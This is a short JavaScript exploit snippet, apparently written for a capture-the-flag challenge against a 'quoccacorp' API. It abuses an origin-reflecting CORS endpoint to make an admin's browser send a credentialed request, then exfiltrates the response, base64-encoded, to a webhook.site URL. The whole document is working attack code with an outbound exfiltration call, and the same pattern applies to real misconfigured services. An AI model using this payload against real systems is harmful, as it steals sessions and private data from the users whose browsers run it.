    <script>
        // 1. The target API that reflects the origin
        // We use window.location.origin to dynamically tell the API to trust WHEREVER this file is hosted
        const target = "https://cors-api.quoccacorp.com/note?cors-allow-origin=" + encodeURIComponent(window.location.origin);
        
        // 2. Your specific webhook
        const webhook = "https://webhook.site/0e8a398d-59bc-426b-91f0-972f1c4f38d3";

        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                // 3. Exfiltrate the response (the flag) to your webhook
                // Using btoa() to base64 encode the flag just in case it has weird characters
                fetch(webhook + "?flag=" + btoa(xhr.responseText));
            }
        };

        xhr.open("GET", target, true);
        
        // CRITICAL: This sends the admin's session cookie to the API
        xhr.withCredentials = true; 
        
        xhr.send();
